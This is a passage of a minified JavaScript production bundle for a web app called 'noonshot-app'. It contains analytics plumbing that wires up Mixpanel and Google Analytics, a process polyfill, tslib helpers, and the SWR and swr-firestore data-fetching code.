Promise.resolve(pe({action:z({},s,{type:h+"End"}),data:{exact:m.after,namespaced:m.afterNS},state:d,allPlugins:u,allMatches:m,instance:n,store:r,EVENTS:i})).then((function(e){e.meta&&e.meta.hasCallback&&de(e.meta.rid,{payload:e})}))}();return t&&t.then?t.then((function(){return e})):e}if(Ee(e,p.length))return e;var s,a=function(){if(c!==h)return Promise.resolve(pe({action:z({},e,{type:h}),data:{exact:m.during,namespaced:m.duringNS},state:d,allPlugins:u,allMatches:m,instance:n,store:r,EVENTS:i})).then((function(e){s=e}));s=e}();return a&&a.then?a.then(t):t()}))}catch(e){return Promise.reject(e)}}(n,c,I,e,D)).then((function(e){var n=t(e);return r=1,n}))}();return Promise.resolve(g&&g.then?g.then(i):i(g))}catch(e){return Promise.reject(e)}}}}),function(e){return function(e){return function(t){var n=t.type,r=t.key,i=t.value,a=t.options;if(n===se.setItem||n===se.removeItem){if(t.abort)return e(t);n===se.setItem?s.setItem(r,i,a):s.removeItem(r,a)}return e(t)}}},(L=I.storage.setItem,function(e){return function(t){return function(n){if(n.type===se.bootstrap){var r=n.params,i=n.user,s=n.persistedUser,a=n.initialUser,o=s.userId===i.userId;s.anonymousId!==i.anonymousId&&L(Y,i.anonymousId),o||L(Z,i.userId),a.traits&&L(ee,z({},o&&s.traits?s.traits:{},a.traits));var l=Object.keys(n.params);if(l.length){var u=r.an_uid,c=r.an_event,h=l.reduce((function(e,t){if(t.match(ae)||t.match(/^(d|g)clid/)){var n=t.replace(ae,"");e.campaign["campaign"===n?"name":n]=r[t]}return t.match(oe)&&(e.props[t.replace(oe,"")]=r[t]),t.match(le)&&(e.traits[t.replace(le,"")]=r[t]),e}),{campaign:{},props:{},traits:{}});e.dispatch(z({type:se.params,raw:r},h,u?{userId:u}:{})),u&&setTimeout((function(){return I.identify(u,h.traits)}),0),c&&setTimeout((function(){return I.track(c,h.props)}),0),Object.keys(h.campaign).length&&e.dispatch({type:se.campaign,campaign:h.campaign})}}return t(n)}}}),(F=(M=I.storage).setItem,B=M.removeItem,q=M.getItem,function(e){return function(t){return function(n){var r=n.userId,i=n.traits,s=n.options;if(n.type===se.reset&&([Z,ee,Y].forEach((function(e){B(e)})),[te,ne,"traits"].forEach((function(e){j(ce(e))}))),n.type===se.identify){q(Y)||F(Y,P());var a=q(Z),o=q(ee)||{};a&&a!==r&&e.dispatch({type:se.userIdChanged,old:{userId:a,traits:o},new:{userId:r,traits:i},options:s}),r&&F(Z,r),i&&F(ee,z({},o,i))}return t(n)}}}),m(Ye)]),T=J,A=J;if(w&&e.debug){var O=window.__REDUX_DEVTOOLS_EXTENSION_COMPOSE__;O&&(T=O({trace:!0,traceLimit:25})),A=function(){return 0==arguments.length?He():N(typeof arguments[0])?We():We().apply(null,arguments)}}var D,R,L,M,F,B,q,$,he,ge=Object.keys($=e).reduce((function(e,t){return Ge.includes(t)||(e[t]=$[t]),e}),{}),ye=i.pluginsArray.reduce((function(e,t){var n=t.name,r=t.config,s=t.loaded,a=i.pluginEnabled[n];return e[n]={enabled:a,initialized:!!a&&Boolean(!t.initialize),loaded:Boolean(s()),config:r||{}},e}),{}),ve=function e(t,n,r){if(typeof n===G&&typeof r===K&&(r=n,n=void 0),typeof r!==K){if(typeof r!==G)throw Error("enhancer"+Q);return r(e)(t,n)}if(typeof t!==G)throw Error("reducer"+Q);var i,s=t,a=n,o=[],l=o,u=!1;function c(){l===o&&(l=o.slice())}function h(e){if(typeof e!==G)throw Error("Listener"+Q);var t=!0;return c(),l.push(e),function(){if(t){t=!1,c();var n=l.indexOf(e);l.splice(n,1)}}}function d(e){if(!N(e))throw Error("Act != obj");if(typeof e.type===K)throw Error("ActType "+K);if(u)throw Error("Dispatch in reducer");try{u=!0,a=s(a,e)}finally{u=!1}for(var t=o=l,n=0;n<t.length;n++)(0,t[n])();return e}return d({type:"@@redux/INIT"}),(i={dispatch:d,subscribe:h,getState:function(){return a},replaceReducer:function(e){if(typeof e!==G)throw Error("next reducer"+Q);s=e,d({type:"@@redux/INIT"})}})[W]=function(){var e;return(e={subscribe:function(e){if("object"!=typeof e)throw TypeError("Observer != obj");function t(){e.next&&e.next(a)}return t(),{unsubscribe:h(t)}}})[W]=function(){return this},e},i}(function(e){for(var t=Object.keys(e),n={},r=0;r<t.length;r++){var i=t[r];typeof e[i]===G&&(n[i]=e[i])}var s,a=Object.keys(n);try{!function(e){Object.keys(e).forEach((function(t){var n=e[t];if(typeof n(void 0,{type:"@@redux/INIT"})===K||typeof n(void 0,{type:H})===K)throw Error("reducer "+t+" "+K)}))}(n)}catch(e){s=e}return function(e,t){if(void 0===e&&(e={}),s)throw s;for(var r=!1,i={},o=0;o<a.length;o++){var l=a[o],u=e[l],c=(0,n[l])(u,t);if(typeof c===K)throw Error(function(e,t){var n=t&&t.type;return"action "+(n&&n.toString()||"?")+"reducer "+e+" returns "+K}(l,t));i[l]=c,r=r||c!==u}return r?i:e}}(z({},{context:ze,user:function(e,t){if(void 0===e&&(e={}),void 0===t&&(t={}),t.type===se.setItemEnd){if(t.key===Y)return z({},e,{anonymousId:t.value});if(t.key===Z)return z({},e,{userId:t.value})}switch(t.type){case se.identify:return Object.assign({},e,{userId:t.userId,traits:z({},e.traits,t.traits)});case se.reset:return[Z,Y,ee].forEach((function(e){s.removeItem(e)})),Object.assign({},e,{userId:null,anonymousId:null,traits:{}});default:return e}},page:qe,track:Re,plugins:function(e,t){void 0===e&&(e={});var n={};if("initialize:aborted"===t.type)return e;if(/^registerPlugin:([^:]*)$/.test(t.type)){var r=Ce(t.type,"registerPlugin"),i=c()[r];if(!i||!r)return e;var s=t.enabled;return n[r]={enabled:s,initialized:!!s&&Boolean(!i.initialize),loaded:!!s&&Boolean(i.loaded()),config:i.config||{}},z({},e,n)}if(/^initialize:([^:]*)$/.test(t.type)){var a=Ce(t.type,se.initialize),o=c()[a];return o&&a?(n[a]=z({},e[a],{initialized:!0,loaded:Boolean(o.loaded())}),z({},e,n)):e}if(/^ready:([^:]*)$/.test(t.type))return n[t.name]=z({},e[t.name],{loaded:!0}),z({},e,n);switch(t.type){case se.disablePlugin:return z({},e,Ne(t.plugins,!1,e));case se.enablePlugin:return z({},e,Ne(t.plugins,!0,e));default:return e}},queue:Pe},n)),{context:ge,user:b,plugins:ye},A(T(X.apply(void 0,E))));ve.dispatch=(he=ve.dispatch,function(e,t,n){var r=z({},e,{meta:Je(e.meta,t,Qe(n))});return he.apply(null,[r])});var we=Object.keys(o);ve.dispatch({type:se.bootstrap,plugins:we,config:ge,params:y,user:b,initialUser:r,persistedUser:v});var Ie=we.filter((function(e){return i.pluginEnabled[e]})),Te=we.filter((function(e){return!i.pluginEnabled[e]}));return ve.dispatch({type:se.registerPlugins,plugins:we,enabled:i.pluginEnabled}),i.pluginsArray.map((function(e,t){var n=e.bootstrap,r=e.config,s=e.name;n&&S(n)&&n({instance:I,config:r,payload:e}),ve.dispatch({type:se.registerPluginType(s),name:s,enabled:i.pluginEnabled[s],plugin:e}),i.pluginsArray.length===t+1&&ve.dispatch({type:se.initializeStart,plugins:Ie,disabled:Te})})),t=function(e){ve.dispatch({type:e?se.offline:se.online})},Ke.bind(null,"online offline",(function(e){return Promise.resolve(!navigator.onLine).then(t)}))(!0),setInterval((function(){return fe(ve,c,I)}),3e3),I}(Et(Et({},{storage:_t}),e))}Tt({});var St=Tt({app:"noonshot-app",plugins:[function(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{};return{name:"mixpanel",config:e,initialize:function(e){var t=e.config,n=t.token,r=t.customScriptSrc,i=t.options;if(!n)throw Error("No mixpanel token defined");void 0===window.mixpanel&&(function(e,t){if(!t.__SV){var n,i,s=window;try{var a,o,l,u=s.location,c=u.hash;a=function(e,t){return(o=e.match(RegExp(t+"=([^&]*)")))?o[1]:null},c&&a(c,"state")&&("mpeditor"===(l=JSON.parse(decodeURIComponent(a(c,"state")))).action&&(s.sessionStorage.setItem("_mpcehash",c),history.replaceState(l.desiredHash||"",e.title,u.pathname+u.search)))}catch(e){}window.mixpanel=t,t._i=[],t.init=function(e,r,s){var a=t;for(void 0!==s?a=t[s]=[]:s="mixpanel",a.people=a.people||[],a.toString=function(e){var t="mixpanel";return"mixpanel"!==s&&(t+="."+s),e||(t+=" (stub)"),t},a.people.toString=function(){return a.toString(1)+".people (stub)"},n="disable time_event track track_pageview track_links track_forms track_with_groups add_group set_group remove_group register register_once alias unregister identify name_tag set_config reset opt_in_tracking opt_out_tracking has_opted_in_tracking has_opted_out_tracking clear_opt_in_out_tracking people.set people.set_once people.unset people.increment people.append people.union people.track_charge people.clear_charges people.delete_user people.remove".split(" "),i=0;i<n.length;i++)!function(e,t){var n=t.split(".");2==n.length&&(e=e[n[0]],t=n[1]),e[t]=function(){e.push([t].concat(Array.prototype.slice.call(arguments,0)))}}(a,n[i]);var o="set set_once union unset remove delete".split(" ");a.get_group=function(){for(var e={},t=["get_group"].concat(Array.prototype.slice.call(arguments,0)),n=0;n<o.length;n++)!function(n){e[n]=function(){call2_args=arguments,call2=[n].concat(Array.prototype.slice.call(call2_args,0)),a.push([t,call2])}}(o[n]);return e},t._i.push([e,r,s])},t.__SV=1.2,(s=e.createElement("script")).type="text/javascript",s.async=!0,s.src=r||("undefined"!=typeof MIXPANEL_CUSTOM_LIB_URL?MIXPANEL_CUSTOM_LIB_URL:"file:"===e.location.protocol&&"//cdn.mxpnl.com/libs/mixpanel-2-latest.min.js".match(/^\/\//)?"https://cdn.mxpnl.com/libs/mixpanel-2-latest.min.js":"//cdn.mxpnl.com/libs/mixpanel-2-latest.min.js"),(a=e.getElementsByTagName("script")[0]).parentNode.insertBefore(s,a)}}(document,window.mixpanel||[]),mixpanel.init(t.token,function(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?d(n,!0).forEach((function(t){var r,i;r=e,i=n[t],t in r?Object.defineProperty(r,t,{value:i,enumerable:!0,configurable:!0,writable:!0}):r[t]=i})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):d(n).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}({batch_requests:!0},void 0===i?{}:i)))},identify:function(e){var t=e.payload,n=t.userId,r=t.traits;"string"==typeof n&&mixpanel.identify(n),r&&mixpanel.people.set(r)},page:function(t){var n=t.payload;mixpanel.track(e.pageEvent||n.properties.path,n.properties)},track:function(e){var t=e.payload;mixpanel.track(t.event,t.properties)},loaded:function(){return!!window.mixpanel},reset:function(){mixpanel.reset()},methods:{alias:function(e,t){mixpanel.alias(e,t)}}}}({token:"1cf333f7615bd0c2ebb2678eaaa7cf1b"}),function(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},t=0,n=u(e.measurementIds),r=i(i({},l),e);return{name:"google-analytics",config:r,initialize:function(e){var t=e.config,r=e.instance,l=t.dataLayerName,u=t.customScriptSrc,c=t.gtagName,d=t.gtagConfig,f=t.debug,p=u||"".concat(a,"?id=").concat(n[0]).concat(l?"&l=".concat(l):"");if(!h(p)){var m=document.createElement("script");m.async=!0,m.src=p,document.body.appendChild(m)}window[l]||(window[l]=window[l]||[],window[c]=function(){window[l].push(arguments)},window[c]("js",new Date));var g=i(i({},o),d||{});!0===f?g.debug_mode=!0:delete g.debug_mode;var y=(r.user()||{}).traits||{};Object.keys(y).length&&window[c]("set","user_properties",y);for(var v=0;v<n.length;v++)s[n[v]]||(window[c]("config",n[v],g),s[n[v]]=!0)},identify:function(e){var t=e.payload,r=e.config.gtagName;window[r]&&n.length&&(t.userId&&window[r]("set",{user_id:t.userId}),Object.keys(t.traits).length&&window[r]("set","user_properties",t.traits))},page:function(e){var r=e.payload,s=e.config,a=e.instance,o=s.gtagName,l=s.gtagConfig;if(window[o]&&n.length){var u=r.properties,h=u.send_to,d=a.getState("context.campaign"),f={page_title:u.title,page_location:u.url,page_path:u.path||document.location.pathname,page_hash:u.hash,page_search:u.page_search,page_referrer:u.referrer},p=c(d),m=i(i(i({},h?{send_to:h}:{}),f),p);if(l&&l.send_page_view&&0===t)return void t++;window[o]("event","page_view",m),t++}},track:function(e){var t=e.payload,r=e.config,s=e.instance,a=t.properties,o=t.event,l=s.getState("context.campaign"),u=r.gtagName;if(window[u]&&n.length){var h=c(l),d=i(i({},a),h);window[u]("event",o,d)}},loaded:function(){var e=r.dataLayerName,t=r.customScriptSrc,n=e&&window[e]&&Array.prototype.push===window[e].push;return h(t||a)&&n},methods:{addTag:function(e){var t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{};window[r.gtagName]&&(window[r.gtagName]("config",e,t),n&&!n.includes(e)&&(n=n.concat(e)))},disable:function(e){for(var t=e?u(e):n,r=0;r<n.length;r++){var i=n[r];t.includes(i)&&(window["ga-disable-".concat(i)]=!0)}},enable:function(e){for(var t=e?u(e):n,r=0;r<n.length;r++){var i=n[r];t.includes(i)&&(window["ga-disable-".concat(i)]=!1)}}}}}({measurementIds:["G-CVLM7ET3G8","G-FL8DN8SV9R"]})]})},531:function(){},3814:function(){},5812:function(){},7663:function(e){!function(){var t={229:function(e){var t,n,r,i=e.exports={};function s(){throw Error("setTimeout has not been defined")}function a(){throw Error("clearTimeout has not been defined")}function o(e){if(t===setTimeout)return setTimeout(e,0);if((t===s||!t)&&setTimeout)return t=setTimeout,setTimeout(e,0);try{return t(e,0)}catch(n){try{return t.call(null,e,0)}catch(n){return t.call(this,e,0)}}}!function(){try{t="function"==typeof setTimeout?setTimeout:s}catch(e){t=s}try{n="function"==typeof clearTimeout?clearTimeout:a}catch(e){n=a}}();var l=[],u=!1,c=-1;function h(){u&&r&&(u=!1,r.length?l=r.concat(l):c=-1,l.length&&d())}function d(){if(!u){var e=o(h);u=!0;for(var t=l.length;t;){for(r=l,l=[];++c<t;)r&&r[c].run();c=-1,t=l.length}r=null,u=!1,function(e){if(n===clearTimeout)return clearTimeout(e);if((n===a||!n)&&clearTimeout)return n=clearTimeout,clearTimeout(e);try{n(e)}catch(t){try{return n.call(null,e)}catch(t){return n.call(this,e)}}}(e)}}function f(e,t){this.fun=e,this.array=t}function p(){}i.nextTick=function(e){var t=Array(arguments.length-1);if(arguments.length>1)for(var n=1;n<arguments.length;n++)t[n-1]=arguments[n];l.push(new f(e,t)),1!==l.length||u||o(d)},f.prototype.run=function(){this.fun.apply(null,this.array)},i.title="browser",i.browser=!0,i.env={},i.argv=[],i.version="",i.versions={},i.on=p,i.addListener=p,i.once=p,i.off=p,i.removeListener=p,i.removeAllListeners=p,i.emit=p,i.prependListener=p,i.prependOnceListener=p,i.listeners=function(e){return[]},i.binding=function(e){throw Error("process.binding is not supported")},i.cwd=function(){return"/"},i.chdir=function(e){throw Error("process.chdir is not supported")},i.umask=function(){return 0}}},n={};function r(e){var i=n[e];if(void 0!==i)return i.exports;var s=n[e]={exports:{}},a=!0;try{t[e](s,s.exports,r),a=!1}finally{a&&delete n[e]}return s.exports}r.ab="//";var i=r(229);e.exports=i}()},4298:function(e,t,n){e.exports=n(5442)},1288:function(e,t,n){"use strict";let r;n.d(t,{PY:function(){return ue},e0:function(){return J},oe:function(){return se},Kx:function(){return oe}});var i,s=n(7294);
/*! *****************************************************************************
Copyright (c) Microsoft Corporation.

Permission to use, copy, modify, and/or distribute this software for any
purpose with or without fee is hereby granted.

THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES WITH
REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF MERCHANTABILITY
AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY SPECIAL, DIRECT,
INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES WHATSOEVER RESULTING FROM
LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION OF CONTRACT, NEGLIGENCE OR
OTHER TORTIOUS ACTION, ARISING OUT OF OR IN CONNECTION WITH THE USE OR
PERFORMANCE OF THIS SOFTWARE.
***************************************************************************** */function a(e,t,n,r){return new(n||(n=Promise))((function(i,s){function a(e){try{l(r.next(e))}catch(e){s(e)}}function o(e){try{l(r.throw(e))}catch(e){s(e)}}function l(e){var t;e.done?i(e.value):((t=e.value)instanceof n?t:new n((function(e){e(t)}))).then(a,o)}l((r=r.apply(e,t||[])).next())}))}function o(e,t){var n,r,i,s,a={label:0,sent:function(){if(1&i[0])throw i[1];return i[1]},trys:[],ops:[]};return s={next:o(0),throw:o(1),return:o(2)},"function"==typeof Symbol&&(s[Symbol.iterator]=function(){return this}),s;function o(s){return function(o){return function(s){if(n)throw TypeError("Generator is already executing.");for(;a;)try{if(n=1,r&&(i=2&s[0]?r.return:s[0]?r.throw||((i=r.return)&&i.call(r),0):r.next)&&!(i=i.call(r,s[1])).done)return i;switch(r=0,i&&(s=[2&s[0],i.value]),s[0]){case 0:case 1:i=s;break;case 4:return a.label++,{value:s[1],done:!1};case 5:a.label++,r=s[1],s=[0];continue;case 7:s=a.ops.pop(),a.trys.pop();continue;default:if(!(i=(i=a.trys).length>0&&i[i.length-1])&&(6===s[0]||2===s[0])){a=0;continue}if(3===s[0]&&(!i||s[1]>i[0]&&s[1]<i[3])){a.label=s[1];break}if(6===s[0]&&a.label<i[1]){a.label=i[1],i=s;break}if(i&&a.label<i[2]){a.label=i[2],a.ops.push(s);break}i[2]&&a.ops.pop(),a.trys.pop();continue}s=t.call(e,a)}catch(e){s=[6,e],r=0}finally{n=i=0}if(5&s[0])throw s[1];return{value:s[0]?s[1]:void 0,done:!0}}([s,o])}}}var l=function(){},u=void 0,c=Object,h=function(e){return e===u},d=function(e){return"function"==typeof e},f=function(e,t){return c.assign({},e,t)},p="undefined",m=function(){return typeof window!=p},g=new WeakMap,y=0,v=function(e){var t,n,r=typeof e,i=e&&e.constructor,s=i==Date;if(c(e)!==e||s||i==RegExp)t=s?e.toJSON():"symbol"==r?e.toString():"string"==r?JSON.stringify(e):""+e;else{if(t=g.get(e))return t;if(t=++y+"~",g.set(e,t),i==Array){for(n=0,t="@";n<e.length;n++)t+=v(e[n])+",";g.set(e,t)}if(i==c){t="#";for(var a=c.keys(e).sort();!h(n=a.pop());)h(e[n])||(t+=n+":"+v(e[n])+",");g.set(e,t)}}return t},w=!0,b=m(),_=typeof document!=p,I=b&&window.addEventListener?window.addEventListener.bind(window):l,E=_?document.addEventListener.bind(document):l,T=b&&window.removeEventListener?window.removeEventListener.bind(window):l,S=_?document.removeEventListener.bind(document):l,k={initFocus:function(e){return E("visibilitychange",e),I("focus",e),function(){S("visibilitychange",e),T("focus",e)}},initReconnect:function(e){var t=function(){w=!0,e()},n=function(){w=!1};return I("online",t),I("offline",n),function(){T("online",t),T("offline",n)}}},A=!m()||"Deno"in window,C=A?s.useEffect:s.useLayoutEffect,N="undefined"!=typeof navigator&&navigator.connection,O=!A&&N&&(["slow-2g","2g"].includes(N.effectiveType)||N.saveData),D=function(e){if(d(e))try{e=e()}catch(t){e=""}var t=[].concat(e),n=(e="string"==typeof e?e:(Array.isArray(e)?e.length:e)?v(e):"")?"$swr$"+e:"";return[e,t,n]},R=new WeakMap,x=function(e,t,n,r,i,s,a){void 0===a&&(a=!0);var o=R.get(e),l=o[0],u=o[1],c=o[3],h=l[t],d=u[t];if(a&&d)for(var f=0;f<d.length;++f)d[f](n,r,i);return s&&(delete c[t],h&&h[0])?h[0](2).then((function(){return e.get(t)})):e.get(t)},P=0,L=function(){return++P},M=function(){for(var e=[],t=0;t<arguments.length;t++)e[t]=arguments[t];return a(void 0,void 0,void 0,(function(){var t,n,r,i,s,a,l,c,p,m,g,y,v,w,b,_,I,E,T,S;return o(this,(function(o){switch(o.label){case 0:if(t=e[0],n=e[1],r=e[2],a=!!h((s="boolean"==typeof(i=e[3])?{revalidate:i}:i||{}).populateCache)||s.populateCache,l=!1!==s.revalidate,c=!1!==s.rollbackOnError,p=s.optimisticData,g=(m=D(n))[0],y=m[2],!g)return[2];if(v=R.get(t)[2],e.length<3)return[2,x(t,g,t.get(g),u,u,l,!0)];if(w=r,_=L(),v[g]=[_,0],I=!h(p),E=t.get(g),I&&(T=d(p)?p(E):p,t.set(g,T),x(t,g,T)),d(w))try{w=w(t.get(g))}catch(e){b=e}return w&&d(w.then)?[4,w.catch((function(e){b=e}))]:[3,2];case 1:if(w=o.sent(),_!==v[g][0]){if(b)throw b;return[2,w]}b&&I&&c&&(a=!0,w=E,t.set(g,E)),o.label=2;case 2:return a&&(b||(d(a)&&(w=a(w,E)),t.set(g,w)),t.set(y,f(t.get(y),{error:b}))),v[g][1]=L(),[4,x(t,g,w,b,u,l,!!a)];case 3:if(S=o.sent(),b)throw b;return[2,a?S:w]}}))}))},F=function(e,t){for(var n in e)e[n][0]&&e[n][0](t)},U=function(e,t){if(!R.has(e)){var n=f(k,t),r={},i=M.bind(u,e),s=l;if(R.set(e,[r,{},{},{},i]),!A){var a=n.initFocus(setTimeout.bind(u,F.bind(u,r,0))),o=n.initReconnect(setTimeout.bind(u,F.bind(u,r,1)));s=function(){a&&a(),o&&o(),R.delete(e)}}return[e,i,s]}return[e,R.get(e)[4]]},V=U(new Map),j=V[0],B=V[1],q=f({onLoadingSlow:l,onSuccess:l,onError:l,onErrorRetry:function(e,t,n,r,i){var s=n.errorRetryCount,a=i.retryCount,o=~~((Math.random()+.5)*(1<<(a<8?a:8)))*n.errorRetryInterval;(h(s)||!(a>s))&&setTimeout(r,o,i)},onDiscarded:l,revalidateOnFocus:!0,revalidateOnReconnect:!0,revalidateIfStale:!0,shouldRetryOnError:!0,errorRetryInterval:O?1e4:5e3,focusThrottleInterval:5e3,dedupingInterval:2e3,loadingTimeout:O?5e3:3e3,compare:function(e,t){return v(e)==v(t)},isPaused:function(){return!1},cache:j,mutate:B,fallback:{}},{isOnline:function(){return w},isVisible:function(){var e=_&&document.visibilityState;return h(e)||"hidden"!==e}}),$=function(e,t){var n=f(e,t);if(t){var r=e.use,i=e.fallback,s=t.use,a=t.fallback;r&&s&&(n.use=r.concat(s)),i&&a&&(n.fallback=f(i,a))}return n},z=(0,s.createContext)({}),G=function(e,t,n){var r=t[e]||(t[e]=[]);return r.push(n),function(){var e=r.indexOf(n);e>=0&&(r[e]=r[r.length-1],r.pop())}},K={dedupe:!0};c.defineProperty((function(e){var t=e.value,n=$((0,s.useContext)(z),t),r=t&&t.provider,i=(0,s.useState)((function(){return r?U(r(n.cache||j),t):u}))[0];return i&&(n.cache=i[0],n.mutate=i[1]),C((function(){return i?i[2]:u}),[]),(0,s.createElement)(z.Provider,f(e,{value:n}))}),"default",{value:q});var H=(i=function(e,t,n){var r=n.cache,i=n.compare,l=n.fallbackData,c=n.suspense,g=n.revalidateOnMount,y=n.refreshInterval,v=n.refreshWhenHidden,w=n.refreshWhenOffline,b=R.get(r),_=b[0],I=b[1],E=b[2],T=b[3],S=D(e),k=S[0],N=S[1],O=S[2],P=(0,s.useRef)(!1),F=(0,s.useRef)(!1),U=(0,s.useRef)(k),V=(0,s.useRef)(t),j=(0,s.useRef)(n),B=function(){return j.current},q=function(){return B().isVisible()&&B().isOnline()},$=function(e){return r.set(O,f(r.get(O),e))},z=r.get(k),H=h(l)?n.fallback[k]:l,W=h(z)?H:z,Q=r.get(O)||{},J=Q.error,X=!P.current,Y=function(){return X&&!h(g)?g:!B().isPaused()&&(c?!h(W)&&n.revalidateIfStale:h(W)||n.revalidateIfStale)},Z=!!k&&!!t&&(!!Q.isValidating||X&&Y()),ee=function(e,t){var n=(0,s.useState)({})[1],r=(0,s.useRef)(e),i=(0,s.useRef)({data:!1,error:!1,isValidating:!1}),a=(0,s.useCallback)((function(e){var s=!1,a=r.current;for(var o in e){var l=o;a[l]!==e[l]&&(a[l]=e[l],i.current[l]&&(s=!0))}s&&!t.current&&n({})}),[]);return C((function(){r.current=e})),[r,i.current,a]}({data:W,error:J,isValidating:Z},F),te=ee[0],ne=ee[1],re=ee[2],ie=(0,s.useCallback)((function(e){return a(void 0,void 0,void 0,(function(){var t,s,a,l,c,f,p,m,g,y,v,w,b;return o(this,(function(o){switch(o.label){case 0:if(t=V.current,!k||!t||F.current||B().isPaused())return[2,!1];l=!0,c=e||{},f=!T[k]||!c.dedupe,p=function(){return!F.current&&k===U.current&&P.current},m=function(){var e=T[k];e&&e[1]===a&&delete T[k]},g={isValidating:!1},y=function(){$({isValidating:!1}),p()&&re(g)},$({isValidating:!0}),re({isValidating:!0}),o.label=1;case 1:return o.trys.push([1,3,,4]),f&&(x(r,k,te.current.data,te.current.error,!0),n.loadingTimeout&&!r.get(k)&&setTimeout((function(){l&&p()&&B().onLoadingSlow(k,n)}),n.loadingTimeout),T[k]=[t.apply(void 0,N),L()]),s=(b=T[k])[0],a=b[1],[4,s];case 2:return s=o.sent(),f&&setTimeout(m,n.dedupingInterval),T[k]&&T[k][1]===a?($({error:u}),g.error=u,!h(v=E[k])&&(a<=v[0]||a<=v[1]||0===v[1])?(y(),f&&p()&&B().onDiscarded(k),[2,!1]):(i(te.current.data,s)?g.data=te.current.data:g.data=s,i(r.get(k),s)||r.set(k,s),f&&p()&&B().onSuccess(s,k,n),[3,4])):(f&&p()&&B().onDiscarded(k),[2,!1]);case 3:return w=o.sent(),m(),!B().isPaused()&&($({error:w}),g.error=w,f&&p()&&(B().onError(w,k,n),("boolean"==typeof n.shouldRetryOnError&&n.shouldRetryOnError||d(n.shouldRetryOnError)&&n.shouldRetryOnError(w))&&q()&&B().onErrorRetry(w,k,n,ie,{retryCount:(c.retryCount||0)+1,dedupe:!0}))),[3,4];case 4:return l=!1,y(),p()&&f&&x(r,k,g.data,g.error,!1),[2,!0]}}))}))}),[k]),se=(0,s.useCallback)(M.bind(u,r,(function(){return U.current})),[]);if(C((function(){V.current=t,j.current=n})),C((function(){if(k){var e=k!==U.current,t=ie.bind(u,K),n=0,r=G(k,I,(function(e,t,n){re(f({error:t,isValidating:n},i(te.current.data,e)?u:{data:e}))})),s=G(k,_,(function(e){if(0==e){var r=Date.now();B().revalidateOnFocus&&r>n&&q()&&(n=r+B().focusThrottleInterval,t())}else if(1==e)B().revalidateOnReconnect&&q()&&t();else if(2==e)return ie()}));return F.current=!1,U.current=k,P.current=!0,e&&re({data:W,error:J,isValidating:Z}),Y()&&(h(W)||A?t():m()&&typeof window.requestAnimationFrame!=p?window.requestAnimationFrame(t):setTimeout(t,1)),function(){F.current=!0,r(),s()}}}),[k,ie]),C((function(){var e;function t(){var t=d(y)?y(W):y;t&&-1!==e&&(e=setTimeout(n,t))}function n(){te.current.error||!v&&!B().isVisible()||!w&&!B().isOnline()?t():ie(K).then(t)}return t(),function(){e&&(clearTimeout(e),e=-1)}}),[y,v,w,ie]),(0,s.useDebugValue)(W),c&&h(W)&&k)throw V.current=t,j.current=n,F.current=!1,h(J)?ie(K):J;return{mutate:se,get data(){return ne.data=!0,W},get error(){return ne.error=!0,J},get isValidating(){return ne.isValidating=!0,Z}}},function(){for(var e=[],t=0;t<arguments.length;t++)e[t]=arguments[t];var n=f(q,(0,s.useContext)(z)),r=d(e[1])?[e[0],e[1],e[2]||{}]:[e[0],null,(null===e[1]?e[2]:e[1])||{}],a=r[0],o=r[1],l=$(n,r[2]),u=i,c=l.use;if(c)for(var h=c.length;h-- >0;)u=c[h](u);return u(a,o||l.fetcher,l)}),W=n(1294);let Q=(0,s.createContext)(null),J=({children:e,fuego:t})=>((e=>{r=e})(t),s.createElement(Q.Provider,{value:{fuego:t}},e)),X={object:{},array:[]},Y=new class{constructor(){var e,t,n;n=void 0,(t="collections")in(e=this)?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,this.collections={}}getSWRKeysFromCollectionPath(e){var t,n;return e.trim().split("/").filter(Boolean).length%2!=0||console.error(`[fuego-swr-keys-from-collection-path] error: Passed a path that was not a collection to useCollection: ${e}.`),null!==(t=null===(n=this.collections[e])||void 0===n?void 0:n.map((({key:e})=>e.filter((e=>"string"==typeof e)))).filter(Boolean))&&void 0!==t?t:X.array}addCollectionToCache(e,t){var n,r;return(null===(n=this.collections[e])||void 0===n?void 0:n.some((({key:n})=>n[0]===e&&n[1]===t)))||(this.collections={...this.collections,[e]:[...null!==(r=this.collections[e])&&void 0!==r?r:X.array,{key:[e,t]}]}),this.collections}},Z="undefined"!=typeof __DEV__&&__DEV__;var ee=n(9208),te=n.n(ee),ne=n(1468),re=n.n(ne);function ie(e,t){let n={...e};return null==t||t.forEach((e=>{if("string"!=typeof e)return;let t=te()(n,e);if(t){var r;let i=null===(r=t.toDate)||void 0===r?void 0:r.call(t);i&&re()(n,e,i)}})),n}let se=(e,t=!1)=>{if(null===e)return null;if(!(e.trim().split("/").filter(Boolean).length%2==0))throw Error(`[@nandorojo/swr-firestore] error: called delete() function with path: ${e}. This is not a valid document path.`);if(!t){B(e,null,!1);let t=e.split("/").filter(Boolean),n=t.pop();t=t.join("/"),Y.getSWRKeysFromCollectionPath(t).forEach((e=>{B(e,((e=X.array)=>e.some((e=>e&&e.id===n))?e.filter((e=>!!e&&e.id!==n)):e),!1)}))}return(0,W.oe)((0,W.JU)(r.db,e))},ae=(e,{where:t,orderBy:n,limit:i,startAt:s,endAt:a,startAfter:o,endBefore:l,isCollectionGroup:u})=>{let c=(0,W.hJ)(r.db,e),h=[];return u&&(c=(0,W.B$)(r.db,e)),t&&(t&&Array.isArray(t[0])?t:[t]).forEach((e=>h.push((0,W.ar)(e[0],e[1],e[2])))),n&&("string"==typeof 